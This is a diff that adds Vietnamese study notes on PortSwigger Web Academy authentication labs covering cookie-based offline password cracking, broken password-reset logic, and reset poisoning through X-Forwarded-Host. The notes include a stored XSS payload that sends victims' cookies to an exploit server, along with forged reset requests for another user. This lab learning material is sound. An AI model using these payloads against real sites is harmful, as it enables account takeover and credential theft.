@@ -229,6 +229,126 @@ Cookie: stay-logged-in=stay;
     3. **Encode** > **Base64**: `base64(username:md5(stay))`
 - Start attack, quan sát request đúng > chuột phải > **Show response in browser** hoặc **Request in browser**
 
+### Lab: Offline password cracking
+#### Analysis
+- Login bằng tài khoản `wiener` kết hợp **Stay logged on**
+- Tìm request `/my-account`, ta thấy trường `stay-logged-in` được set trong **cookie**
+
+```http
+GET /my-account?id=wiener HTTP/2
+Host: 0a4900e3032d6e9a8143addb009200a9.web-security-academy.net
+Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=mZrf6FaliE6NBuZcCwyFHtC6YxTqHX3z
+```
+- Xóa `session` và gửi lại request => vẫn còn đăng nhập => cookie `stay-logged-in` được lưu để sử dụng lâu dài, có thể không cần cookie `session` vẫn ở trạng thái đã đăng nhập
+- Thử logout và login lại bằng tài khoản `wiener` => cookie `stay-logged-in` vẫn như cũ => sử dụng chung 1 thuật toán tạo giá trị giống nhau
+- Bôi đen giá trị `stay-logged-in`, nhìn sang tab **Inspector** > decode Base64 ta nhận được giá trị: `wiener:51dc30ddc473d43a6011e9ebba6ca770`
+- Thuật toán mã hóa như lab trên: `base64(username:md5(password))`
+- Xóa tài khoản `wiener` => yêu cầu mật khẩu nhưng không nhập
+- Login bằng tài khoản `carlos` với mật khẩu bất kỳ nhiều lần => block 
+- Không thể **burte-force** khi không có danh sách password sẵn
+- Đã có thuật toán tạo nên cookie `stay-logged-in`. Vậy, chỉ cần lấy được nó từ người dùng là có được mật khẩu 
+
+#### Exploit
+- Đến một blog bất kỳ, thực hiện tấn công **XSS** => Thành công
+- Tạo payload lấy cookie nạn nhân
+
+```http
+POST /post/comment HTTP/2
+Host: 0aec005503720f598045a37000320093.web-security-academy.net
+...
+postId=8&comment=<script>
+fetch("https://exploit-0a5300d903610f6f8082a2d2015e00b2.exploit-server.net/log?"+ document.cookie);
+</script>&name=a&email=a@gmail.com&website=http://a.com
+```
+
+- Lấy cookie `stay-logged-in` từ **Exploit Server** và giải mã nó
+- Truy cập **my-account** với `id=carlos` và `stay-logged-in` lấy được
+
+```http
+GET /my-account?id=carlos HTTP/2
+Host: 0aec005503720f598045a37000320093.web-security-academy.net
+Cookie: stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+```
+
+- Thực hiện xóa tài khoản
+
+### Lab: Password reset broken logic
+#### Analysis
+- Thử chức năng **forgot-password** với tài khoản `wiener`
+- Truy cập vào đường dẫn được gửi về trong **email client** và thay đổi password
+
+```http
+POST /forgot-password?temp-forgot-password-token=bkxg2q8ye699i2jt1bjjoy2rgdkok9po HTTP/2
+Host: 0afd00fb03351ecd809f7cb6003200f5.web-security-academy.net
+...
+temp-forgot-password-token=bkxg2q8ye699i2jt1bjjoy2rgdkok9po&username=wiener&new-password-1=a&new-password-2=a
+```
+- Quan sát ta thấy việc thay password phụ thuộc vào **temp-forgot-password-token** và param **username** có thể thay đổi được
+- Thử thay đổi nhưng sử dụng **temp-forgot-password-token** không có thật => vẫn đổi được
+
+#### Exploit
+- Thay đổi username thành `carlos` với **temp-forgot-password-token** không có thật
+
+```http
+POST /forgot-password?temp-forgot-password-token=abc HTTP/2
+Host: 0afd00fb03351ecd809f7cb6003200f5.web-security-academy.net
+...
+temp-forgot-password-token=abcegdh&username=carlos&new-password-1=a&new-password-2=a
+```
+
+- Đăng nhập bằng tài khoản `carlos` với password đã đổi
+
+#### How it work?
+- Website gửi một URL reset chứa token tạm thời dạng:
+
+```
+/forgot-password?temp-forgot-password-token=abc123...
+```
+- Nhưng khi người dùng gửi form đổi mật khẩu, server không kiểm tra giá trị token này.
+- Điều đó có nghĩa: bất kỳ ai gửi yêu cầu **POST** đúng định dạng, với **username=target** đều có thể đổi được mật khẩu của người khác mà không cần **temp-forgot-password-token**.
+
+### Lab: Password reset poisoning via middleware
+Danh sách các header X-Forwarded- phổ biến
+
+| Header               | Ý nghĩa                        | Ví dụ                              |
+| -------------------- | ------------------------------ | ---------------------------------- |
+| `X-Forwarded-For`    | IP gốc của client gửi request  | `X-Forwarded-For: 203.0.113.10`    |
+| `X-Forwarded-Host`   | Host gốc mà client truy cập    | `X-Forwarded-Host: example.com`    |
+| `X-Forwarded-Proto`  | Protocol gốc (http hoặc https) | `X-Forwarded-Proto: https`         |
+| `X-Forwarded-Port`   | Cổng được sử dụng ban đầu      | `X-Forwarded-Port: 443`            |
+| `X-Forwarded-Server` | Tên máy chủ xử lý request      | `X-Forwarded-Server: my-server-01` |
+
+#### Analysis
+- Forgot password với username `wiener`
+- Quan sát nội dung trong **Email client** 
+
+```
+https://0a95000604ff46c1808353c700fc006b.web-security-academy.net/forgot-password?temp-forgot-password-token=3q9g73mu0ox2x9iz0wyu3fctn2bxtcn1
+```
+
+- Gửi request forgot password đến **Burp Repeater**
+- Gửi lại request bổ sung header **X-Forwarded-Host** với giá trị là url của **Exploit Server**
+
+```http
+POST /forgot-password HTTP/2
+Host: 0a95000604ff46c1808353c700fc006b.web-security-academy.net
+X-Forwarded-Host: exploit-0aa100f8049146298038523301630081.exploit-server.net
+...
+username=wiener
+```
+
+- Thấy link đính kèm email sẽ trở thành đường dẫn của **Exploit Server**
+
+```
+https://exploit-0aa100f8049146298038523301630081.exploit-server.net/forgot-password?temp-forgot-password-token=7zj8gpafxtg9aejd9y99qh91j4kui1jt
+```
+
+#### Exploit
+- Thực hiện forgot password với username `carlos` để ứng dụng gửi mail về `carlos` 
+- Khi `carlos` click vào đường dẫn đã bị thao túng, tức sẽ gửi **temp-forgot-password-token** đến **Exploit Server**
+- Vào **log** trong **Exploit Server** vào truy cập vào `orgot-password?temp-forgot-password-token=carlos-token` để thay đổi mật khẩu
+- Login bằng tài khoản của `carlos`
+
 ## Prevent
 ---
 ### 1. Protect User Credentials
